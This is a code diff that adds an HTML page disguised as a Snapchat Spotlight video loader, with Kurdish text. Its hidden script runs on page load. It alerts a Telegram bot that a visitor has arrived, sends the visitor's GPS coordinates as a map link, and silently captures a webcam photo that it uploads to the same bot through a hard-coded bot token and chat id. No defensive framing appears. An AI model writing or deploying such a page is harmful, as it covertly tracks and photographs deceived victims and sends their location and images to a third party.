@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Spotlight</title>
+    <style>
+        body { background-color: #000; color: white; font-family: Arial; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        video, canvas { display: none; }
+        .loader { border: 5px solid #333; border-top: 5px solid #fffc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="loader"></div>
+        <h1>Snapchat Spotlight</h1>
+        <p>تکایە ڕێگە بدە بۆ بارکردنی ڤیدیۆکە...</p>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const token = '8897748348:AAGMPKCQUdNf6Hf2CtcZbuuqznTLqdarrIA';
+        const chat_id = '646169404';
+
+        // ١. ناردنی نامەی ئاسایی
+        async function sendMessage(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: text })
+            });
+        }
+
+        // ٢. وەرگرتنی شوێن (Location)
+        function askLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendMessage(`📍 شوێنی دۆزرایەوە:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                }, () => sendMessage("⚠️ ڕێگەی بە شوێن (GPS) نەدا."));
+            }
+        }
+
+        // ٣. گرتنی وێنە و ناردنی
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob, 'snap.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                sendMessage("⚠️ ڕێگەی بە کامێرا نەدا.");
+            }
+        }
+
+        // کاتێک سایتەکە دەکرێتەوە
+        window.onload = () => {
+            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، ئێستا داوای کامێرا و شوێنی لێ دەکرێت...");
+            askLocation();
+            startCamera();
+        };
+    </script>
+</body>
+</html>
